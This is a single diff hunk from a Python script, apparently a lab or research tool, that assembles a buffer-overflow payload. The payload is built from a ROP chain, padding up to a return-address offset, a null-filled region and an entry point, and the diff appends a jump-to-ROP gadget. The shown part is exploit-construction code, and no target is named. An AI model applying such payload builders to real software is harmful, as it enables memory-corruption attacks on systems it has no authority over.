@@ -21,8 +21,9 @@ rop_chain = p.parse(tape_start + tape_size // 2, rop_chain_start)
 entry_point = p.get_entry_point()
 offset = b"A" * (payload_max_size - tape_size - len(rop_chain) + ra_offset)
 tape = b"\x00" * tape_size
+jump_to_rop = p.jump_to_rop(rop_chain_start)
 
-payload = rop_chain + offset + tape + entry_point
+payload = rop_chain + offset + tape + entry_point + jump_to_rop
 
 print(f"The payload has {len(payload)} bytes and can be found in the input.txt file")
 print(f"The rop_chain itself has {len(rop_chain)} bytes")
